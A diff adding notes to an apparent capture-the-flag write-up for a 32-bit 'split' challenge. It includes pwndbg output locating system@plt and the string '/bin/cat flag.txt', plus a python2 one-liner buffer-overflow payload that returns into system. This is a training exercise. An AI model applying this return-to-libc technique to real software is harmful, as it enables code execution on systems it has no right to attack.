@@ -1,3 +1,15 @@
+# Split
+
+Objective:
+
+Overflow buffer, and return to system (ret2libc), printing flag.txt
+
+Security:
+
+|RELRO|STACK CANARY|NX|PIE|RPATH|RUNPATH|Symbols|FORTIFY|Fortified|Fortifiable|FILE|ASLR|
+|-|-|-|-|-|-|-|-|-|-|-|-|
+|Partial RELRO|No canary found|NX enabled|No PIE|No RPATH|No RUNPATH|72) Symbols|No|0|3|ret2win32|ASLR Disabled|
+
 ### 32 bit answers:
 
 - Finding addresses using gdb:
@@ -65,7 +77,29 @@
     0xf7dfdd00 <__libc_system>:	0x100468e8
     pwndbg> 
     ```
-    
+
+    ```
+    pwndbg> disas usefulFunction
+    Dump of assembler code for function usefulFunction:
+       0x0804860c <+0>:	push   ebp
+       0x0804860d <+1>:	mov    ebp,esp
+       0x0804860f <+3>:	sub    esp,0x8
+       0x08048612 <+6>:	sub    esp,0xc
+       0x08048615 <+9>:	push   0x804870e
+       0x0804861a <+14>:	call   0x80483e0 <system@plt>
+       0x0804861f <+19>:	add    esp,0x10
+       0x08048622 <+22>:	nop
+       0x08048623 <+23>:	leave  
+       0x08048624 <+24>:	ret    
+    End of assembler dump.
+    pwndbg>
+    ```
+
+    ```
+    pwndbg> search "/bin/cat"
+    split32         0x804a030 '/bin/cat flag.txt'
+    ```
+
 - Return to system via usefulFunction:
 
     `python2 -c "print('A' * 44 + '\x1a\x86\x04\x08' + '\x30\xa0\x04\x08')" | ./split32`
